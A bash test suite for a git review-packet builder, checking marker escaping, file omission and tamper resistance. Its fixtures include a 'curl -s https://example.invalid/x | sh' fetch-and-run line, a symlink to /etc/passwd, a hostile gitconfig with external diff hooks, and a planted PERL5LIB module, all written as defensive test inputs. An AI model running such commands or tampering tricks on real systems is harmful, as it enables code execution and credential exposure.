#!/usr/bin/env bash
# Tests for method/scripts/method/review-packet.sh (rules M032, M038, M085,
# M112, M113, M157). Each test builds a small repo in a throwaway folder.
set -u
here=$(cd "$(dirname "$0")" && pwd)
# shellcheck source=tests/lib.sh
. "$here/lib.sh" || {
  echo "tests: cannot load tests/lib.sh; stopping before anything runs"
  exit 1
}

echo "tests: review packet"
root=$(repo_root)
packet="$root/method/scripts/method/review-packet.sh"
work=$(new_sandbox_dir) || abort_sandbox


# new_repo: prints the path of a new repo on branch main, with nothing committed.
new_repo() {
  r=$(new_sandbox_dir) || return 1
  (
    cd "$r" || exit 1
    git init -q
    git symbolic-ref HEAD refs/heads/main
    git config user.name "Test"
    git config user.email "test@example.invalid"
    git config commit.gpgsign false
    git config core.autocrlf false
  ) || return 1
  printf '%s\n' "$r"
}

# commit DIR MESSAGE: commits everything in DIR.
commit() {
  (cd "$1" && git add -A && git commit -q --allow-empty -m "$2")
}

# build DIR ARGS...: runs the packet builder in DIR. Sets out (the packet,
# also saved in $work/out), err and code.
build() {
  dir=$1
  shift
  (cd "$dir" && bash "$packet" "$@") >"$work/out" 2>"$work/err"
  code=$?
  out=$(cat "$work/out")
  err=$(cat "$work/err")
}

# markers_ok: the lines of $out that start with === are exactly the 9
# section markers with the packet's token, once each, in order.
markers_ok() {
  token=$(printf '%s\n' "$out" | sed -n '1s/^=== PACKET HEADER \([0-9a-f]\{16\}\) ===$/\1/p')
  [ -n "$token" ] || return 1
  marker_list=""
  for m in HEADER CRITERIA REVIEW CHECKLIST CHECKS FILES DIFF ANSWER END; do marker_list="$marker_list=== PACKET $m $token ===|"; done
  [ "$(printf '%s\n' "$out" | grep '^===' | tr '\n' '|')" = "$marker_list" ]
}

# expect NAME WANTED_CODE STRING...: the last build exited WANTED_CODE and
# its packet (or, for a refusal, its message) holds every STRING.
expect() {
  name=$1
  want=$2
  shift 2
  missing=""
  for s in "$@"; do
    case "$out$err" in
      *"$s"*) ;;
      *) missing="$missing [$s]" ;;
    esac
  done
  if [ "$code" -ne "$want" ]; then
    fail "$name: exit $code, wanted $want" "$err"
  elif [ -n "$missing" ]; then
    fail "$name: missing$missing" "$(printf '%s\n' "$out$err" | head -40)"
  elif [ "$want" -eq 0 ] && ! markers_ok; then
    fail "$name: the === lines are not exactly the 9 markers in order" "$(printf '%s\n' "$out" | grep '^===')"
  elif [ "$want" -ne 0 ] && [ -n "$out" ]; then
    fail "$name: a refusal still wrote a packet" "$(printf '%s\n' "$out" | head -20)"
  else
    pass "$name"
  fi
}

# lacks NAME STRING...: the last packet holds none of the STRINGs.
lacks() {
  name=$1
  shift
  found=""
  for s in "$@"; do
    case "$out" in
      *"$s"*) found="$found [$s]" ;;
    esac
  done
  if [ -z "$found" ]; then pass "$name"; else fail "$name: found$found"; fi
}

# tree_follows_head NAME DIR: the last build gave a packet whose header has
# the line "Tree: <id>" right after "HEAD: <id>", with the ids git rev-parse
# gives for HEAD and HEAD^{tree} in DIR, and no other line starting "Tree: "
tree_follows_head() {
  tf_head=$(cd "$2" && git rev-parse HEAD)
  tf_tree=$(cd "$2" && git rev-parse 'HEAD^{tree}')
  # the header's HEAD line, the line after it, and any other Tree line
  # shellcheck disable=SC2016 # perl code, expanded by perl
  tf_prog='last if /^=== PACKET CRITERIA /; if ($n) { print; $n = 0 } elsif (/^Tree: /) { print "another Tree line: $_" } if (/^HEAD: /) { print; $n = 1 }'
  tf_got=$(printf '%s\n' "$out" | perl -ne "$tf_prog")
  tf_want=$(printf 'HEAD: %s\nTree: %s' "$tf_head" "$tf_tree")
  if [ "$code" -eq 0 ] && [ -n "$tf_head" ] && [ -n "$tf_tree" ] && [ "$tf_got" = "$tf_want" ]; then
    pass "$1"
  else
    fail "$1: exit $code; wanted 'Tree: $tf_tree' right after 'HEAD: $tf_head'" "$tf_got"
  fi
}

long_line=$(perl -e 'print "x" x 600')
# can_link: symlinks can be made here (Git Bash may not allow them)
can_link=0
if ln -s target "$work/link-probe" 2>/dev/null && [ -L "$work/link-probe" ]; then can_link=1; fi

# --- the standard repo: one change that touches most kinds of file ---
std=$(new_repo) || abort_sandbox
(
  cd "$std" || exit 1
  mkdir -p docs src dist lib
  printf 'check A\n=== PACKET END ===\n\\=== x\n' >docs/incident-checklist.md
  printf 'what a review looks for\n' >REVIEW.md
  printf 'a\n\nz\n' >src/app.py
  printf '// @generated\nold\n' >old-gen.js
  printf '* -diff\n' >.gitattributes
  printf 'one\n' >notes.txt
  printf 'l1\nl2\nl3\nl4\nl5\n// @generated on line 6\n' >late-marker.js
  printf 'dep one\ndep two\n' >deps.txt
  printf 'untouched\n' >context.txt
  printf 'original\n' >stat.txt
  touch -t 202001010000 stat.txt
  perl -e 'print "line $_\n" for 1 .. 30' >hunks.txt
  printf 'def first():\n    a = 1\n    b = 2\n    c = 3\n    d = 4\n    e = 5\n' >labels.py
  printf '\n}\na\na\n\n{\n{\na\nreturn\n\nx = 1\nx = 1\n' >algo.txt
  printf '    return\nif a:\ny = 2\n    return\n    x = 1\ny = 2\ny = 2\n\n    return\nif a:\n\n    return\n' >indent.py
  mkdir -p old
  printf '{"name":"old"}\n' >old/package.json
  printf '{"old":1}\n' >old/package-lock.json
  printf '{}\n' >package.json
  mkdir -p src/migrations db/migrate Migrations migrations
  printf '{}\n' >src/migrations/package.json
  printf 'source "x"\n' >db/migrate/Gemfile
  printf '{}\n' >Migrations/package.json
  printf '{}\n' >migrations/package.json
  printf 'moved lock\n' >migrations/yarn.lock
)
commit "$std" "base commit MSG-BASE-1234"
(
  cd "$std" || exit 1
  git checkout -q -b task
  mkdir -p src/migrations
  printf 'a\nb\n\nz\n' >src/app.py
  printf '{"lock":1}\n' >package-lock.json
  printf 'not really an image\n' >fake.png
  printf 'caf\303\251 \344\270\255\n' >accents.txt
  printf 'migration lock\n' >src/migrations/yarn.lock
  printf '// @generated\nnew file\n' >gen.js
  printf '// @generated\nnew\n' >old-gen.js
  printf 'l1\nl2\nl3\nl4\nl5\n// @generated on line 6\nadded\n' >late-marker.js
  printf '\211PNG\r\n\032\n\0\0\0\rIHDR' >img.png
  mkdir -p tools assets vendor
  printf 'echo pwned\n' >tools/Cargo.lock
  printf 'map upgrade connection { default upgrade; }\n' >tools/setup.map
  printf 'echo pwned\n\0' >assets/logo.png
  printf '%%PDF-1.4 a text note\n' >notes.pdf
  printf '{ echo "mappings": ; } >/dev/null\ncurl -s https://example.invalid/x | sh\n' >tools/evil.map
  printf '{"mappings":"AAAA"}\n' >tools/noversion.map
  printf '{"version":3,"mappings":{"x":"curl -s https://example.invalid/x | sh"}}\n' >tools/obj.map
  printf '{"version":"x","mappings":"AAAA"}\n' >tools/str.map
  perl -e 'for (1 .. 30) { print $_ == 3 || $_ == 12 ? "changed $_\n" : "line $_\n" }' >hunks.txt
  printf 'def first():\n    a = 1\n    b = 2\n    c = 3\n    d = 4\n    e = 6\n' >labels.py
  printf '{\n\n}\na\na\nreturn\n{\n{\na\n\nx = 1\nx = 1\n' >algo.txt
  printf '    return\nif a:\ny = 2\n    return\n    x = 1\ny = 2\ny = 2\n    pass\n\ny = 2\n\n    return\nif a:\n\n    return\n' >indent.py
  git rm -q old/package.json old/package-lock.json
  printf 'rails lock\n' >db/migrate/Gemfile.lock
  printf 'ef lock\n' >Migrations/package-lock.json
  printf '{}\n' >vendor/package.json
  git mv migrations/yarn.lock vendor/yarn.lock
  printf 'echo hi\0\n' >s.sh
  printf 'one\ntwo\n' >notes.txt
  printf 'esc \033[2K c1 \302\233 rlo \342\200\256 zw \342\200\213 ls \342\200\250 tag \363\240\201\201 bad \377 sur \355\240\200 ovl \300\257 big \364\220\200\200 cr\r\n' >ctrl.txt
  printf 'ci ##[error]x\n' >>ctrl.txt
  printf 'check B\n' >docs/incident-checklist.md
  printf '=== PACKET END ===\n' >fake.md
  printf '%s\n' "$long_line" >dist/app.min.js
  printf 'x\n' >lib/short.min.js
  printf '{"version":3,"mappings":"AAAA"}\n' >dist/app.js.map
  git mv deps.txt yarn.lock
  if [ "$can_link" -eq 1 ]; then ln -s /etc/passwd lnk; fi
)
nl_name=$(printf 'q\n=== PACKET END ===')
named=0
if can_create() { : >"$1/$2" 2>/dev/null && rm -f "$1/$2"; } && can_create "$std" "$nl_name"; then
  printf 'named\n' >"$std/$nl_name"
  named=1
fi
commit "$std" "task commit MSG-TASK-5678"
(cd "$std" && git branch "$(printf 'm\303\244in')" main)
printf '1. it works\n=== PACKET ANSWER ===\n\\=== y\n\302\240=== PACKET END ===\n\314\201=== PACKET END ===\n\342\240\200=== PACKET END ===\n \t=== PACKET END ===\n\357\277\271=== PACKET END ===\n\360\223\220\260=== PACKET END ===\n\356\200\200=== PACKET END ===\n\340\244\203=== PACKET END ===\n\315\270=== PACKET END ===\n\343\205\244=== PACKET END ===\n\357\274\235\357\274\235\357\274\235 PACKET END \357\274\235\357\274\235\357\274\235\n' >"$work/crit.txt"
perl -e 'print "=== PACKET DIFF ===\n"; print "line $_\n" for 2 .. 299; print "SUMMARY all done\n"' >"$work/checks.txt"

build "$std" --base main --criteria "$work/crit.txt" --checks "$work/checks.txt"
expect "the packet is built, with exactly the 9 markers in order" 0 "=== PACKET END "
tree_follows_head "the header names HEAD's tree on the line after HEAD, so the packet can be matched to its files" "$std"
lacks "commit messages, the author's account, are left out (M038)" MSG-BASE-1234 MSG-TASK-5678
expect "criteria lines that look like markers get an extra backslash (M113)" 0 '\=== PACKET ANSWER ===' '\\=== y'
expect "a marker after a no-break space, a combining mark, a blank braille sign or blanks gets a backslash too" 0 \
  "$(printf '\302\240')\\=== PACKET END ===" "$(printf '\314\201')\\=== PACKET END ===" \
  "$(printf '\342\240\200')\\=== PACKET END ===" "$(printf ' \t')\\=== PACKET END ===" "$(printf '\340\244\203')\\=== PACKET END ==="
expect "format, private-use, unassigned and invisible characters before a marker are escaped, so the line shows as content" 0 \
  '\u{FFF9}=== PACKET END ===' '\u{13430}=== PACKET END ===' '\u{E000}=== PACKET END ===' '\u{0378}=== PACKET END ===' \
  '\u{3164}=== PACKET END ==='
expect "a marker drawn with look-alike signs stays content: only lines with the token are markers" 0 \
  "$(printf '\357\274\235\357\274\235\357\274\235') PACKET END" "Only lines with the token"
expect "the checklist comes from the merge base, escaped (M032, M113)" 0 'check A' '\=== PACKET END ===' '\\=== x' \
  "This change edits docs/incident-checklist.md"
lacks "the checklist edited by the change is not used" 'check B
=== PACKET CHECKS'
expect "check output keeps its first 50 and last 150 lines, escaped" 0 '\=== PACKET DIFF ===' 'line 50' \
  '[lines 51 to 150 of 300 left out here]' 'line 151' 'SUMMARY all done'
lacks "check output leaves out the middle lines" 'line 51
' 'line 150
'
expect "lockfiles, minified files, source maps and old @generated files are listed but left out (M112)" 0 \
  'A package-lock.json (left out of the diff: lockfile, +1 -0)' \
  'A dist/app.min.js (left out of the diff: minified file' \
  'A dist/app.js.map (left out of the diff: source map' \
  'M old-gen.js (left out of the diff: generated file'
lacks "left-out files have no diff" '+{"lock":1}' "+$long_line" '+{"version":3,"mappings":"AAAA"}' '+new
'
expect "a migration folder, short-lined .min.js, a new @generated file, a marker on line 6 and a rename to a lockfile name are kept" 0 \
  'FILE A src/migrations/yarn.lock' '+migration lock' 'FILE A lib/short.min.js' 'FILE A gen.js' '+// @generated' \
  'FILE M late-marker.js' '+added' 'FILE R deps.txt -> yarn.lock'
expect "lockfiles in migrate, Migrations and moved out of migrations are kept (M112)" 0 \
  'FILE A db/migrate/Gemfile.lock' '+rails lock' 'FILE A Migrations/package-lock.json' '+ef lock' \
  'FILE R migrations/yarn.lock -> vendor/yarn.lock'
expect "a lockfile name with no manifest, a .map that is not a source map and a .png without its signature are shown" 0 \
  'FILE A tools/Cargo.lock' '+echo pwned' 'FILE A tools/setup.map' '+map upgrade' 'FILE A assets/logo.png' '+\x00' \
  'FILE A notes.pdf' '+%PDF-1.4 a text note' 'FILE A tools/evil.map' '+curl -s https://example.invalid/x | sh' \
  'FILE A tools/noversion.map' '+{"mappings":"AAAA"}' 'FILE A tools/obj.map' 'FILE A tools/str.map'
expect "a deleted lockfile next to its deleted manifest is left out; the manifest is shown" 0 \
  'D old/package-lock.json (left out of the diff: lockfile' 'FILE D old/package.json'
expect "a real binary is one line; a NUL byte does not hide a script; a text file named .png is shown" 0 \
  'A img.png (binary, 16 bytes)' 'binary file: not shown' 'FILE A s.sh' '+echo hi\x00' 'FILE A fake.png' '+not really an image'
expect "a -diff attribute on every file hides no text" 0 'FILE M notes.txt' '+two' 'FILE M src/app.py'
expect "a hunk header keeps only its line numbers, with no function name" 0 "$(printf '@@ -3,4 +3,4 @@\n     b = 2')"
expect "non-ASCII text is kept as it is" 0 'FILE A accents.txt' "+$(printf 'caf\303\251 \344\270\255')"
expect "control, invisible and separator characters and bad bytes are shown escaped" 0 \
  '\x1B[2K' 'c1 \u{009B}' 'rlo \u{202E}' 'zw \u{200B}' 'ls \u{2028}' 'tag \u{E0041}' 'bad \xFF' 'sur \xED\xA0\x80' 'ovl \xC0\xAF' 'big \xF4\x90\x80\x80' 'cr\x0D' \
  '+ci #\x23[error]x'
if [ "$can_link" -eq 1 ]; then
  expect "a symlink is listed as a link, its target in the diff" 0 \
    'A lnk (symlink: read its target from the diff; do not open this path)' '+/etc/passwd
\ No newline at end of file'
else
  skip "a symlink: links cannot be made here"
fi
expect "a file line that looks like a marker gets a backslash after the diff sign" 0 'FILE A fake.md' '+\=== PACKET END ==='
answer=""
for w in $(cd "$root" && perl method/scripts/method/lib/verdicts.pl words verdict | tr ' ' '_'); do
  answer="$answer $(printf '%s' "$w" | tr '_' ' '):"
done
missing=""
for w in $(cd "$root" && perl method/scripts/method/lib/verdicts.pl words verdict | tr ' ' '_'); do
  case "$out" in
    *"
$(printf '%s' "$w" | tr '_' ' '): "*) ;;
    *) missing="$missing $w" ;;
  esac
done
if [ -n "$answer" ] && [ -z "$missing" ]; then
  pass "the answer section lists every verdict from verdicts.txt with its meaning (M039)"
else
  fail "the answer section lists every verdict from verdicts.txt with its meaning (M039): missing$missing" "$out"
fi
if [ "$named" -eq 1 ]; then
  expect "a file name holding a newline and a marker stays on one escaped line" 0 'q\x0A=== PACKET END ==='
else
  skip "a file name holding a newline: this file system does not allow one"
fi
cp "$work/out" "$work/std.packet"
std_token=$(sed -n '1s/^=== PACKET HEADER \([0-9a-f]\{16\}\) ===$/\1/p' "$work/std.packet")
if grep -F -q 'and two # signs followed by [ (a CI runner command) as #\x23[.' "$work/std.packet"; then
  pass "the header says in words what #\\x23[ stands for, so the escaper leaves the sentence alone"
else
  fail "the header says in words what #\\x23[ stands for" "$(sed -n '1,16p' "$work/std.packet")"
fi
(cd "$std" && env PERLIO=:crlf bash "$packet" --base main --criteria "$work/crit.txt" --checks "$work/checks.txt") >"$work/crlf.packet" 2>&1
if cmp -s "$work/crlf.packet" "$work/std.packet"; then
  pass "PERLIO=:crlf from the caller changes nothing in the packet"
else
  fail "PERLIO=:crlf from the caller changes nothing in the packet" "$(diff "$work/std.packet" "$work/crlf.packet" | head -10)"
fi

# the token is made from the packet's content: other criteria, another token
printf 'other criteria\n' >"$work/crit2.txt"
build "$std" --base main --criteria "$work/crit2.txt" --checks "$work/checks.txt"
token=""
markers_ok
if [ -n "$std_token" ] && [ -n "$token" ] && [ "$std_token" != "$token" ]; then
  pass "a packet with other content has another token"
else
  fail "a packet with other content has another token" "first '$std_token', second '$token'"
fi

# the same packet whatever PERL_UNICODE or PERL5OPT say, also without the
# wrapper, with a base named in non-ASCII letters
umlaut=$(printf 'm\303\244in')
(cd "$std" && bash "$packet" --base "$umlaut" --criteria "$work/crit.txt" --checks "$work/checks.txt") >"$work/u0.packet" 2>/dev/null
same=1
case "$(cat "$work/u0.packet")" in
  *"meets '$umlaut'"*) ;;
  *) same=0 ;;
esac
for setting in "PERL_UNICODE=SDA" "PERL5OPT=-CSDA"; do
  (cd "$std" && env "$setting" bash "$packet" --base "$umlaut" --criteria "$work/crit.txt" --checks "$work/checks.txt") >"$work/u.packet" 2>/dev/null
  cmp -s "$work/u0.packet" "$work/u.packet" || same=0
  (cd "$std" && env "$setting" perl "$root/method/scripts/method/lib/packet.pl" --base "$umlaut" --criteria "$work/crit.txt" --checks "$work/checks.txt") >"$work/u.packet" 2>/dev/null
  cmp -s "$work/u0.packet" "$work/u.packet" || same=0
done
if [ "$same" -eq 1 ]; then pass "the packet is the same under PERL_UNICODE and PERL5OPT, with or without the wrapper"; else fail "the packet is the same under PERL_UNICODE and PERL5OPT, with or without the wrapper"; fi

# a hostile git setup changes nothing: global settings, an external diff and
# a text conversion, and the environment settings
mkdir -p "$work/home-clean" "$work/home-hostile"
printf '#!/bin/sh\necho HOSTILE\n' >"$work/hostile.sh"
chmod +x "$work/hostile.sh"
cat >"$work/home-hostile/.gitconfig" <<EOF
[color]
	ui = always
[core]
	quotepath = false
[diff]
	orderFile = $work/order.txt
	interHunkContext = 10
	algorithm = patience
	indentHeuristic = false
	noprefix = true
	mnemonicPrefix = true
	external = $work/hostile.sh
	context = 0
	ignoreSubmodules = all
	suppressBlankEmpty = true
	renames = copies
[diff "x"]
	textconv = $work/hostile.sh
	command = $work/hostile.sh
	xfuncname = ^(.*)$
EOF
printf '*.txt\n' >"$work/order.txt"
printf '* diff=x\n' >>"$std/.git/info/attributes"
(cd "$std" && HOME="$work/home-clean" GIT_CONFIG_NOSYSTEM=1 bash "$packet" --base main --criteria "$work/crit.txt") >"$work/clean.packet" 2>/dev/null
(cd "$std" && HOME="$work/home-hostile" GIT_CONFIG_NOSYSTEM=1 GIT_DIFF_OPTS=-u0 GIT_EXTERNAL_DIFF="$work/hostile.sh" \
  GIT_LITERAL_PATHSPECS=1 GIT_ICASE_PATHSPECS=1 bash "$packet" --base main --criteria "$work/crit.txt") >"$work/hostile.packet" 2>/dev/null
if [ -s "$work/clean.packet" ] && cmp -s "$work/clean.packet" "$work/hostile.packet"; then
  pass "hostile git settings and an external diff do not change the packet"
else
  fail "hostile git settings and an external diff do not change the packet" "$(diff "$work/clean.packet" "$work/hostile.packet" | head -20)"
fi

# a local diff.renameLimit cannot turn moves into deletes and adds (the names
# change too, so git cannot match them by name first)
rl=$(new_repo) || abort_sandbox
seq 1 40 >"$rl/a.txt"
seq 101 140 >"$rl/b.txt"
commit "$rl" base
(cd "$rl" && git checkout -q -b feature && mkdir src && git mv a.txt src/alpha.txt && git mv b.txt src/beta.txt &&
  echo 41 >>src/alpha.txt && echo 141 >>src/beta.txt)
commit "$rl" moves
(cd "$rl" && git config diff.renameLimit 1)
if (cd "$rl" && git diff --name-status main feature 2>/dev/null | grep -q '^D'); then pass "setup: git itself lists the moves as deletes"; else fail "setup: git itself lists the moves as deletes"; fi
build "$rl" --base main
expect "a local diff.renameLimit does not turn moves into deletes and adds" 0 "FILE R a.txt -> src/alpha.txt" "FILE R b.txt -> src/beta.txt"

# only bash, git and perl are needed
mkdir -p "$work/bin"
for tool in bash git perl; do ln -s "$(command -v "$tool")" "$work/bin/$tool"; done
(cd "$std" && PATH="$work/bin" "$work/bin/bash" "$packet" --base main --criteria "$work/crit.txt" --checks "$work/checks.txt") >"$work/path.packet" 2>"$work/err"
if cmp -s "$work/std.packet" "$work/path.packet"; then pass "it runs with only bash, git and perl on PATH"; else fail "it runs with only bash, git and perl on PATH" "$(cat "$work/err")"; fi

# a failed write is an error, not a success
(cd "$std" && bash "$packet" --base main >&- 2>/dev/null)
code=$?
if [ "$code" -eq 2 ]; then pass "a failed write exits 2"; else fail "a failed write exits 2: exit $code"; fi

# --- refusals and errors ---
build "$std" --base main --criteria "$work/no-such-file"
expect "a missing criteria file exits 2" 2 "is not a file"
build "$std" --base main --criteria "$work"
expect "a folder given as the criteria file exits 2" 2 "is not a file"
build "$std" --base main --checks "$work"
expect "a folder given as the check output exits 2" 2 "is not a file"
for bad in "--output=$work/x-out" "-x" ""; do
  build "$std" --base "$bad"
  expect "the base '$bad' is refused before git sees it" 2 "must not be empty or start with '-'"
done
if [ -e "$work/x-out" ]; then fail "a base starting with - wrote a file"; else pass "a base starting with - wrote no file"; fi
build "$std" --base no-such-branch
expect "an unknown base exits 2" 2 "is not a commit here"
build "$std" --base main --since "-x"
expect "a --since starting with - exits 2" 2 "must not be empty or start with '-'"
build "$std" --base main --what x
expect "an unknown option exits 2" 2 "usage:"
build "$std"
expect "no --base exits 2" 2 "usage:"

(cd "$std" && git checkout -q --orphan lonely && git rm -rq --cached . && printf 'z\n' >z.txt && git add z.txt && git commit -qm lonely && git checkout -q -f task)
build "$std" --base lonely
expect "a base with no shared history exits 2 and says to fetch more" 2 "share no history" "git fetch --deepen"

# --- commits only: the working copy must be the committed change ---
printf 'edited\n' >>"$std/src/app.py"
build "$std" --base main
expect "an uncommitted change is refused" 1 "commit first"
(cd "$std" && git add src/app.py)
build "$std" --base main
expect "a staged change is refused" 1 "commit first"
(cd "$std" && git reset -q && git checkout -q -- src/app.py)
printf 'scratch\n' >"$std/untracked.txt"
build "$std" --base main
expect "an untracked file does not stop the packet, and the header says such files are not part of the change" 0 "=== PACKET END " \
  "a file on disk that git does not track is not part of the change"
rm -f "$std/untracked.txt"
for flag in skip-worktree assume-unchanged; do
  (cd "$std" && git update-index "--$flag" src/app.py)
  printf 'hidden edit\n' >>"$std/src/app.py"
  build "$std" --base main
  expect "an edit hidden by --$flag is refused" 1 "the working copy of src/app.py is not what was committed"
  (cd "$std" && git update-index "--no-$flag" src/app.py && git checkout -q -- src/app.py)
done
if [ "$can_link" -eq 1 ]; then
  (cd "$std" && git update-index --skip-worktree lnk && rm -f lnk && ln -s /etc/hostname lnk)
  build "$std" --base main
  expect "a symlink pointed elsewhere under skip-worktree is refused" 1 "the working copy of lnk is not what was committed"
  (cd "$std" && git update-index --no-skip-worktree lnk && rm -f lnk && git checkout -q -- lnk)
else
  skip "a symlink under skip-worktree: links cannot be made here"
fi
(cd "$std" && git update-index --skip-worktree context.txt)
printf 'hidden context edit\n' >>"$std/context.txt"
build "$std" --base main
expect "an edit hidden by skip-worktree in a file outside the change is refused" 1 "the working copy of context.txt is not what was committed"
(cd "$std" && git update-index --no-skip-worktree context.txt && git checkout -q -- context.txt)
# a lone CR is a line break in some languages, so only CRLF counts as a line
# end; and a file that is not a regular file is never opened
(cd "$std" && git update-index --skip-worktree context.txt && printf 'untou\rched\n' >context.txt)
build "$std" --base main
expect "a lone CR added under skip-worktree is refused" 1 "the working copy of context.txt is not what was committed"
(cd "$std" && rm -f context.txt && mkfifo context.txt 2>/dev/null)
if [ -p "$std/context.txt" ]; then
  build "$std" --base main
  expect "a FIFO in place of a file under skip-worktree is refused, not read" 1 "the working copy of context.txt is not a regular file"
else
  skip "a FIFO in place of a file: mkfifo is not available here"
fi
(cd "$std" && rm -f context.txt && git update-index --no-skip-worktree context.txt && git checkout -q -- context.txt)
# an edit that keeps the size and the time stamp, under settings that tell
# git to ignore change times
(cd "$std" && cp -p stat.txt "$work/stat.ref" && printf 'EDITED!!\n' >stat.txt && touch -r "$work/stat.ref" stat.txt)
for setting in core.trustctime=false core.checkStat=minimal; do
  (cd "$std" && git config "${setting%%=*}" "${setting#*=}")
  if [ -z "$(cd "$std" && git status --porcelain --untracked-files=no)" ]; then
    build "$std" --base main
    expect "an edit hidden from git status by $setting is refused" 1 "the working copy of stat.txt is not what was committed"
  else
    skip "an edit hidden by $setting: this git sees the edit anyway"
  fi
  (cd "$std" && git config --unset "${setting%%=*}")
done
(cd "$std" && rm -f stat.txt && git checkout -q -- stat.txt)
(cd "$std" && git update-index --assume-unchanged context.txt)
printf 'hidden context edit\n' >>"$std/context.txt"
build "$std" --base main
expect "an edit hidden by assume-unchanged in a file outside the change is refused" 1 "the working copy of context.txt is not what was committed"
(cd "$std" && git update-index --no-assume-unchanged context.txt && git checkout -q -- context.txt)
(cd "$std" && git update-index --skip-worktree context.txt)
rm -f "$std/context.txt"
build "$std" --base main
expect "a file outside the change that is missing under skip-worktree (sparse checkout) is fine" 0 "=== PACKET END "
(cd "$std" && git update-index --no-skip-worktree context.txt && git checkout -q -- context.txt)
printf '#!/bin/sh\n: >"%s/.git/fsm-ran"\nprintf "token\\0"\n' "$std" >"$std/.git/fsm-hook.sh"
chmod +x "$std/.git/fsm-hook.sh"
(cd "$std" && git config core.fsmonitor "$std/.git/fsm-hook.sh" && git status --porcelain >/dev/null)
rm -f "$std/.git/fsm-ran"
printf 'edit a file-system monitor hides\n' >>"$std/context.txt"
build "$std" --base main
expect "an edit that a file-system monitor hook would hide from git status is refused" 1 "commit first"
if [ -e "$std/.git/fsm-ran" ]; then
  fail "a file-system monitor hook does not run inside the builder"
else
  pass "a file-system monitor hook does not run inside the builder"
fi
(cd "$std" && git config --unset core.fsmonitor && git checkout -q -- context.txt)
mkdir -p "$work/evil"
mkdir -p "$work/evil/Digest"
printf 'package Digest::SHA; die "planted: a module from PERL5LIB ran\\n"; 1;\n' >"$work/evil/Digest/SHA.pm"
(cd "$std" && PERL5LIB="$work/evil" bash "$packet" --base main --criteria "$work/crit.txt" --checks "$work/checks.txt") >"$work/lib.packet" 2>"$work/err"
if cmp -s "$work/std.packet" "$work/lib.packet"; then
  pass "a module put on PERL5LIB does not run inside the builder"
else
  fail "a module put on PERL5LIB does not run inside the builder" "$(cat "$work/err")"
fi
(cd "$std" && PERL5OPT=-T bash "$packet" --base main --criteria "$work/crit.txt" --checks "$work/checks.txt") >"$work/opt.packet" 2>"$work/err"
if cmp -s "$work/std.packet" "$work/opt.packet"; then
  pass "PERL5OPT is cleared before perl starts: even -T, which stops perl itself, changes nothing"
else
  fail "PERL5OPT is cleared before perl starts: even -T, which stops perl itself, changes nothing" "$(cat "$work/err")"
fi
(cd "$std" && git update-index --skip-worktree src/app.py)
rm -f "$std/src/app.py"
build "$std" --base main
expect "a changed file missing from the working copy is refused" 1 "src/app.py is in the change but missing from the working copy"
(cd "$std" && git update-index --no-skip-worktree src/app.py && git checkout -q -- src/app.py)

# local replace refs and grafts do not change what is shown
app_blob=$(cd "$std" && git rev-parse HEAD:src/app.py)
other_blob=$(cd "$std" && printf 'a\nharmless\n' | git hash-object -w --stdin)
(cd "$std" && git replace "$app_blob" "$other_blob")
build "$std" --base main
expect "a local replace ref does not change the content shown" 0 "+b"
lacks "the replaced content is not shown" "+harmless"
(cd "$std" && git replace -d "$app_blob" >/dev/null)

# --- later rounds (M085) ---
rounds=$(new_repo) || abort_sandbox
printf 'base\n' >"$rounds/base.txt"
commit "$rounds" "base"
before=$(cd "$rounds" && git rev-parse HEAD)
printf 'base two\n' >"$rounds/base2.txt"
commit "$rounds" "base two"
(cd "$rounds" && git checkout -q -b task && printf 'early change\n' >early.txt)
commit "$rounds" "round 1"
first=$(cd "$rounds" && git rev-parse HEAD)
printf 'later change\n' >"$rounds/later.txt"
commit "$rounds" "fix after round 1"
build "$rounds" --base main --since "$first"
expect "--since shows only the changes since the last reviewed version" 0 "the changes since the last reviewed version $first" \
  "Last reviewed version: $first" "FILE A later.txt" "The whole change, from the merge base to HEAD, touches these files:
A early.txt
A later.txt"
lacks "--since leaves the earlier change out of the diff" "FILE A early.txt" "+early change"
build "$rounds" --base main --since HEAD
expect "--since HEAD: nothing to review, exit 3" 3 "nothing to review"
commit "$rounds" "an empty commit"
build "$rounds" --base main --since HEAD~1
expect "--since before an empty commit: nothing to review, exit 3" 3 "nothing to review"
build "$rounds" --base main --since no-such-commit
expect "an unknown --since shows the whole change, in doubt" 0 "in doubt" "FILE A early.txt" "FILE A later.txt"
(cd "$rounds" && git checkout -q -b side main && printf 'side\n' >side.txt && git add side.txt && git commit -qm side && git checkout -q task)
side=$(cd "$rounds" && git rev-parse side)
build "$rounds" --base main --since "$side"
expect "a --since outside the branch shows the whole change, in doubt" 0 "in doubt" "FILE A early.txt"
build "$rounds" --base main --since "$before"
expect "a --since before the merge base shows the whole change, in doubt" 0 "in doubt" "FILE A early.txt"
lacks "a --since before the merge base does not pull in the base's own commits" "base2.txt"
printf '%s %s\n' "$first" "$side" >"$rounds/.git/info/grafts"
build "$rounds" --base main --since "$side"
expect "a grafts file does not make an outside --since look reviewed" 0 "in doubt" "FILE A early.txt"
rm -f "$rounds/.git/info/grafts"
(cd "$rounds" && git replace --graft "$first" "$side")
build "$rounds" --base main --since "$side"
expect "a replace --graft does not make an outside --since look reviewed" 0 "in doubt" "FILE A early.txt"
(cd "$rounds" && git replace -d "$first" >/dev/null)
build "$rounds" --base main --since main
expect "a --since equal to the merge base shows the whole change, and says why" 0 "the last reviewed version is the merge base" \
  "FILE A early.txt" "FILE A later.txt"
lacks "a --since equal to the merge base adds no second file list" "Last reviewed version:" "The whole change, from the merge base"
(cd "$rounds" && git checkout -q main && printf 'later on main\n' >m.txt && git add m.txt && git commit -qm "main moves on" && git checkout -q task)
build "$rounds" --base main
expect "a base that moved on is compared from the merge base" 0 "FILE A early.txt"
lacks "commits on the base after the branch point are not in the packet" "m.txt"
(cd "$rounds" && git checkout -q -b old-side "$before" && printf 'old side\n' >old-side.txt && git add old-side.txt &&
  git commit -qm "old side" && git checkout -q task && git merge -q --no-edit old-side >/dev/null 2>&1)
build "$rounds" --base main --since old-side
expect "a --since on a side branch that the change merged, from before the merge base, shows the whole change, in doubt" 0 \
  "in doubt" "FILE A early.txt"

# --- nothing to review, and a change of noise only ---
empty=$(new_repo) || abort_sandbox
printf 'base\n' >"$empty/base.txt"
printf '{}\n' >"$empty/package.json"
commit "$empty" "base"
build "$empty" --base main
expect "no change: nothing to review, exit 3, no packet (M038)" 3 "nothing to review"
(cd "$empty" && git checkout -q -b task && printf 'resolved "https://example.invalid/x"\n' >yarn.lock)
commit "$empty" "lockfile only"
build "$empty" --base main
